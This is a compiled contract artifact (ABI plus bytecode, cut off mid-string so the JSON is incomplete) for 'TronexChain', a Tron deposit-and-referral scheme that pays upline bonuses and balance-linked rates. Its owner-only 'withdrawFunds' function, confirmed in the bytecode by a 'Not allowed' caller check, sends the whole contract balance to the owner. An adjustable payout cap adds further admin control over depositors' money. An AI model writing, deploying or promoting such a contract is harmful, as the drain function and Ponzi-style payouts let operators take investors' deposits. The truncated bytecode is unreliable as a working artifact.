{
  "contractName": "TronexChain",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "PERCENTS_DIVIDER",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "TIME_STEP",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "aff_bonus",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "BASE_PERCENT",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "CONTRACT_BALANCE_STEP",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "total_withdraw",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "max_receivable",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "name": "users",
      "outputs": [
        {
          "name": "cycle",
          "type": "uint256"
        },
        {
          "name": "upline",
          "type": "address"
        },
        {
          "name": "referrals",
          "type": "uint256"
        },
        {
          "name": "payouts",
          "type": "uint256"
        },
        {
          "name": "direct_bonus",
          "type": "uint256"
        },
        {
          "name": "gen_bonus",
          "type": "uint256"
        },
        {
          "name": "deposit_amount",
          "type": "uint256"
        },
        {
          "name": "deposit_payouts",
          "type": "uint256"
        },
        {
          "name": "deposit_time",
          "type": "uint40"
        },
        {
          "name": "total_deposits",
          "type": "uint256"
        },
        {
          "name": "total_payouts",
          "type": "uint256"
        },
        {
          "name": "total_structure",
          "type": "uint256"
        },
        {
          "name": "team_biz",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "name": "cycles",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "alt_owner",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "name": "ref_bonuses",
      "outputs": [
        {
          "name": "",
          "type": "uint8"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "team_levels",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "fee",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "total_deposited",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "MIN_DEPOSIT",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "total_users",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "name": "_owner",
          "type": "address"
        },
        {
          "name": "_alt_owner",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "name": "addr",
          "type": "address"
        },
        {
          "indexed": true,
          "name": "upline",
          "type": "address"
        }
      ],
      "name": "Upline",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "name": "addr",
          "type": "address"
        },
        {
          "indexed": false,
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "NewDeposit",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "name": "addr",
          "type": "address"
        },
        {
          "indexed": true,
          "name": "from",
          "type": "address"
        },
        {
          "indexed": false,
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "DirectPayout",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "name": "addr",
          "type": "address"
        },
        {
          "indexed": true,
          "name": "from",
          "type": "address"
        },
        {
          "indexed": false,
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "MatchPayout",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "name": "addr",
          "type": "address"
        },
        {
          "indexed": false,
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "Withdraw",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "name": "addr",
          "type": "address"
        },
        {
          "indexed": false,
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "LimitReached",
      "type": "event"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_upline",
          "type": "address"
        }
      ],
      "name": "deposit",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "_addr",
          "type": "address"
        }
      ],
      "name": "payoutOf",
      "outputs": [
        {
          "name": "payout",
          "type": "uint256"
        },
        {
          "name": "max_payout",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "_addr",
          "type": "address"
        }
      ],
      "name": "getUserDividends",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "getContractBalance",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "_balance",
          "type": "uint256"
        }
      ],
      "name": "getTotalSteps",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "getRate",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "getContractBonus",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "_amount",
          "type": "uint256"
        }
      ],
      "name": "maxPayoutOf",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "_addr",
          "type": "address"
        }
      ],
      "name": "getUserBalance",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_maxRecPercent",
          "type": "uint256"
        }
      ],
      "name": "changeMaxRec",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "withdrawFunds",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_newAdmin",
          "type": "address"
        }
      ],
      "name": "changeAdmin",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "getAdmin",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "_addr",
          "type": "address"
        }
      ],
      "name": "userInfo",
      "outputs": [
        {
          "name": "upline",
          "type": "address"
        },
        {
          "name": "deposit_time",
          "type": "uint40"
        },
        {
          "name": "deposit_amount",
          "type": "uint256"
        },
        {
          "name": "payouts",
          "type": "uint256"
        },
        {
          "name": "direct_bonus",
          "type": "uint256"
        },
        {
          "name": "gen_bonus",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "_addr",
          "type": "address"
        }
      ],
      "name": "userInfoTotals",
      "outputs": [
        {
          "name": "referrals",
          "type": "uint256"
        },
        {
          "name": "total_deposits",
          "type": "uint256"
        },
        {
          "name": "total_payouts",
          "type": "uint256"
        },
        {
          "name": "total_structure",
          "type": "uint256"
        },
        {
          "name": "team_biz",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "contractInfo",
      "outputs": [
        {
          "name": "_total_users",
          "type": "uint256"
        },
        {
          "name": "_total_deposited",
          "type": "uint256"
        },
        {
          "name": "_total_withdraw",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "bytecode": "0x60806040526000600255601e600355600f60045560016008553480156200002557600080fd5b50d380156200003357600080fd5b50d280156200004157600080fd5b5060405160408062004587833981018060405260408110156200006357600080fd5b810190808051906020019092919080519060200190929190505050816000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506007601e908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff160217905550506007600a908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff1602179055505060076005908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff1602179055505060076005908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff1602179055505060076005908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff1602179055505060076005908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff1602179055505060076005908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff1602179055505060076005908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff1602179055505060076005908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff16021790555050600664174876e800908060018154018082558091505090600182039060005260206000200160009091929091909150555060066445d964b8009080600181540180825580915050906001820390600052602060002001600090919290919091505550600664d18c2e2800908060018154018082558091505090600182039060005260206000200160009091929091909150555060066501d1a94a20009080600181540180825580915050906001820390600052602060002001600090919290919091505550505061412080620004676000396000f3fe608060405260043610610216576000357c01000000000000000000000000000000000000000000000000000000009004806374b95b2d1161012a578063b741c62a116100bd578063ddca3f431161008c578063ddca3f4314610d8c578063de560cca14610dd1578063e1e158a514610e16578063e7cc62bd14610e5b578063f340fa0114610ea057610216565b8063b741c62a14610c22578063b7d9f0d214610c93578063bf6e196414610d02578063ca42feab14610d4757610216565b80639a8318f4116100f95780639a8318f414610a225780639acb6b2d14610a67578063a87430ba14610aac578063afbce3b914610bb957610216565b806374b95b2d146108425780638959af3c146108dd5780638da5cb5b146109465780638f283970146109b757610216565b806347734892116101ad578063679aefce1161017c578063679aefce1461067c5780636aabddee146106c15780636da61d1e146107065780636e9960c31461078c5780636f9fb98a146107fd57610216565b8063477348921461051e578063517540841461059d5780635988859f146105e257806362f3765e1461063757610216565b80631cf0160c116101e95780631cf0160c1461040e57806324600fc31461047757806332bc298c146104a85780633ccfd60b146104ed57610216565b806301c234a81461021b578063040a772e1461026057806315c43aaf146102df5780631959a00214610332575b600080fd5b34801561022757600080fd5b50d3801561023457600080fd5b50d2801561024157600080fd5b5061024a610ee4565b6040518082815260200191505060405180910390f35b34801561026c57600080fd5b50d3801561027957600080fd5b50d2801561028657600080fd5b506102c96004803603602081101561029d57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610eea565b6040518082815260200191505060405180910390f35b3480156102eb57600080fd5b50d380156102f857600080fd5b50d2801561030557600080fd5b5061030e6111d3565b60405180848152602001838152602001828152602001935050505060405180910390f35b34801561033e57600080fd5b50d3801561034b57600080fd5b50d2801561035857600080fd5b5061039b6004803603602081101561036f57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506111ec565b604051808773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018664ffffffffff1664ffffffffff168152602001858152602001848152602001838152602001828152602001965050505050505060405180910390f35b34801561041a57600080fd5b50d3801561042757600080fd5b50d2801561043457600080fd5b506104616004803603602081101561044b57600080fd5b81019080803590602001909291905050506113cd565b6040518082815260200191505060405180910390f35b34801561048357600080fd5b50d3801561049057600080fd5b50d2801561049d57600080fd5b506104a661142d565b005b3480156104b457600080fd5b50d380156104c157600080fd5b50d280156104ce57600080fd5b506104d76115ca565b6040518082815260200191505060405180910390f35b3480156104f957600080fd5b50d3801561050657600080fd5b50d2801561051357600080fd5b5061051c6115cf565b005b34801561052a57600080fd5b50d3801561053757600080fd5b50d2801561054457600080fd5b506105876004803603602081101561055b57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050611f35565b6040518082815260200191505060405180910390f35b3480156105a957600080fd5b50d380156105b657600080fd5b50d280156105c357600080fd5b506105cc61240e565b6040518082815260200191505060405180910390f35b3480156105ee57600080fd5b50d380156105fb57600080fd5b50d2801561060857600080fd5b506106356004803603602081101561061f57600080fd5b8101908080359060200190929190505050612413565b005b34801561064357600080fd5b50d3801561065057600080fd5b50d2801561065d57600080fd5b50610666612539565b6040518082815260200191505060405180910390f35b34801561068857600080fd5b50d3801561069557600080fd5b50d280156106a257600080fd5b506106ab61253e565b6040518082815260200191505060405180910390f35b3480156106cd57600080fd5b50d380156106da57600080fd5b50d280156106e757600080fd5b506106f06125b0565b6040518082815260200191505060405180910390f35b34801561071257600080fd5b50d3801561071f57600080fd5b50d2801561072c57600080fd5b5061076f6004803603602081101561074357600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506125b7565b604051808381526020018281526020019250505060405180910390f35b34801561079857600080fd5b50d380156107a557600080fd5b50d280156107b257600080fd5b506107bb612899565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561080957600080fd5b50d3801561081657600080fd5b50d2801561082357600080fd5b5061082c6128c2565b6040518082815260200191505060405180910390f35b34801561084e57600080fd5b50d3801561085b57600080fd5b50d2801561086857600080fd5b506108ab6004803603602081101561087f57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506128e1565b604051808681526020018581526020018481526020018381526020018281526020019550505050505060405180910390f35b3480156108e957600080fd5b50d380156108f657600080fd5b50d2801561090357600080fd5b506109306004803603602081101561091a57600080fd5b8101908080359060200190929190505050612a4b565b6040518082815260200191505060405180910390f35b34801561095257600080fd5b50d3801561095f57600080fd5b50d2801561096c57600080fd5b50610975612a88565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b3480156109c357600080fd5b50d380156109d057600080fd5b50d280156109dd57600080fd5b50610a20600480360360208110156109f457600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050612aad565b005b348015610a2e57600080fd5b50d38015610a3b57600080fd5b50d28015610a4857600080fd5b50610a51612c0c565b6040518082815260200191505060405180910390f35b348015610a7357600080fd5b50d38015610a8057600080fd5b50d28015610a8d57600080fd5b50610a96612c12565b6040518082815260200191505060405180910390f35b348015610ab857600080fd5b50d38015610ac557600080fd5b50d28015610ad257600080fd5b50610b1560048036036020811015610ae957600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050612c18565b604051808e81526020018d73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018c81526020018b81526020018a81526020018981526020018881526020018781526020018664ffffffffff1664ffffffffff1681526020018581526020018481526020018381526020018281526020019d505050505050505050505050505060405180910390f35b348015610bc557600080fd5b50d38015610bd257600080fd5b50d28015610bdf57600080fd5b50610c0c60048036036020811015610bf657600080fd5b8101908080359060200190929190505050612caf565b6040518082815260200191505060405180910390f35b348015610c2e57600080fd5b50d38015610c3b57600080fd5b50d28015610c4857600080fd5b50610c51612cd2565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b348015610c9f57600080fd5b50d38015610cac57600080fd5b50d28015610cb957600080fd5b50610ce660048036036020811015610cd057600080fd5b8101908080359060200190929190505050612cf8565b604051808260ff1660ff16815260200191505060405180910390f35b348015610d0e57600080fd5b50d38015610d1b57600080fd5b50d28015610d2857600080fd5b50610d31612d2b565b6040518082815260200191505060405180910390f35b348015610d5357600080fd5b50d38015610d6057600080fd5b50d28015610d6d57600080fd5b50610d76612d31565b6040518082815260200191505060405180910390f35b348015610d9857600080fd5b50d38015610da557600080fd5b50d28015610db257600080fd5b50610dbb612da9565b6040518082815260200191505060405180910390f35b348015610ddd57600080fd5b50d38015610dea57600080fd5b50d28015610df757600080fd5b50610e00612daf565b6040518082815260200191505060405180910390f35b348015610e2257600080fd5b50d38015610e2f57600080fd5b50d28015610e3c57600080fd5b50610e45612db5565b6040518082815260200191505060405180910390f35b348015610e6757600080fd5b50d38015610e7457600080fd5b50d28015610e8157600080fd5b50610e8a612dbc565b6040518082815260200191505060405180910390f35b610ee260048036036020811015610eb657600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050612dc2565b005b61271081565b6000803073ffffffffffffffffffffffffffffffffffffffff16638959af3c600560008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600601546040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004018082815260200191505060206040518083038186803b158015610f9c57600080fd5b505afa158015610fb0573d6000803e3d6000fd5b505050506040513d6020811015610fc657600080fd5b810190808051906020019092919050505090506000610fe3612dd9565b9050600082600560008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206007015410156111c857600560008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206007015461271060b4600560008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060080160009054906101000a900464ffffffffff1664ffffffffff1642038115156110df57fe5b0484600560008a73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060060154020281151561112f57fe5b040390508281600560008873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600701540111156111c757600560008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060070154830390505b5b809350505050919050565b6000806000600854600954600a54925092509250909192565b600080600080600080600560008873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060010160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600560008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060080160009054906101000a900464ffffffffff16600560008a73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060060154600560008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060030154600560008c73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060040154600560008d73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206005015495509550955095509550955091939550919395565b6000806000905060008090506000620f424085029050600062989680828115156113f357fe5b04905060328111151561140f5760028102935060009250611419565b6064935083810392505b600083850190508095505050505050919050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614806114d55750600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16145b1515611549576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600b8152602001807f4e6f7420616c6c6f77656400000000000000000000000000000000000000000081525060200191505060405180910390fd5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f193505050501580156115c7573d6000803e3d6000fd5b50565b60b481565b6000803073ffffffffffffffffffffffffffffffffffffffff16636da61d1e336040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050604080518083038186803b15801561166a57600080fd5b505afa15801561167e573d6000803e3d6000fd5b505050506040513d604081101561169457600080fd5b8101908080519060200190929190805190602001909291905050509150915080600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206003015410151561176c576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600c8152602001807f46756c6c207061796f757473000000000000000000000000000000000000000081525060200191505060405180910390fd5b60008211156118b4578082600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206003015401111561180957600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060030154810391505b81600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206007016000828254019250508190555081600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600301600082825401925050819055506118b33383612e4b565b5b80600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206003015410801561194757506000600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060040154115b15611ace576000600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206004015490508181600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060030154011115611a2757600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060030154820390505b80600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206004016000828254039250508190555080600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600301600082825401925050819055508083019250505b80600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060030154108015611b6157506000600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060050154115b15611ce8576000600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206005015490508181600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060030154011115611c4157600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060030154820390505b80600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206005016000828254039250508190555080600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600301600082825401925050819055508083019250505b600082111515611d60576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600b8152602001807f5a65726f207061796f757400000000000000000000000000000000000000000081525060200191505060405180910390fd5b81600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600a016000828254019250508190555081600a600082825401925050819055503373ffffffffffffffffffffffffffffffffffffffff166108fc839081150290604051600060405180830381858888f19350505050158015611e06573d6000803e3d6000fd5b503373ffffffffffffffffffffffffffffffffffffffff167f884edad9ce6fa2440d8a54cc123490eb96d2768479d49ff9c7366125a9424364836040518082815260200191505060405180910390a280600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060030154101515611f31573373ffffffffffffffffffffffffffffffffffffffff167f97ddeb77c85e6a1dd99a34fe2bb1a4f9b211d5ffced7a707de9dbeb24363d0e4600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600301546040518082815260200191505060405180910390a25b5050565b60008060003073ffffffffffffffffffffffffffffffffffffffff16636da61d1e856040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050604080518083038186803b158015611fd257600080fd5b505afa158015611fe6573d6000803e3d6000fd5b505050506040513d6040811015611ffc57600080fd5b8101908080519060200190929190805190602001909291905050509150915060008211156120b9578082600560008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600301540111156120b857600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060030154810391505b5b80600560008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206003015410801561214c57506000600560008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060040154115b15612233576000600560008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206004015490508181600560008873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206003015401111561222c57600560008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060030154820390505b8083019250505b80600560008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600301541080156122c657506000600560008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060050154115b156123ad576000600560008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206005015490508181600560008873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600301540111156123a657600560008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060030154820390505b8083019250505b80600560008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206003015410151561240357600092505050612409565b81925050505b919050565b600881565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614806124bb5750600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16145b151561252f576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600b8152602001807f4e6f7420616c6c6f77656400000000000000000000000000000000000000000081525060200191505060405180910390fd5b8060028190555050565b607881565b6000803073ffffffffffffffffffffffffffffffffffffffff16319050600080905060008090506000629896808481151561257557fe5b049050603281111515612591576002810292506000915061259b565b6064925082810391505b60008284019050806078019550505050505090565b6298968081565b6000803073ffffffffffffffffffffffffffffffffffffffff16638959af3c600560008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600601546040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004018082815260200191505060206040518083038186803b15801561266957600080fd5b505afa15801561267d573d6000803e3d6000fd5b505050506040513d602081101561269357600080fd5b8101908080519060200190929190505050905060006126b0612dd9565b905081600560008673ffffffff